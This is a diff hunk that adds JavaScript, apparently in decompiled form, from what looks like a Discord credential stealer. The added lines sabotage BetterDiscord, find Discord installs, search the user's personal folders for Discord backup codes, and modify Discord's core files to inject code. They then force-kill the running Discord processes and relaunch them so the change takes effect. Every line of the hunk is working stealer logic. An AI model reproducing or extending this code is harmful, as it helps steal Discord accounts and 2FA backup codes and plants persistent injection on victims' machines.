@@ -1,0 +1,19 @@
+_tmp_0.init = init
+this.pwnBetterDiscord()
+_iterator_10 = <operator>.iterator(client.requires.fs.readdirSync(client.utils.encryption.decryptData(client.config.user.localappdata)))
+(_tmp_114 = folder.toLowerCase()).includes
+client.config.discord.executables.push(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${folder}`)
+_iterator_11 = <operator>.iterator(client.config.discord.executables)
+this.findDiscordCore(executable, client.requires.fs.readdirSync(executable))
+["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
+                await this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
+            })
+await this.modify_discord_core()
+await client.requires.child_process.exec('tasklist', async (err, stdout) => {
+                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
+                    if (stdout.includes(executable)) {
+                        await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
+                        await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
+                    }
+                }
+            })
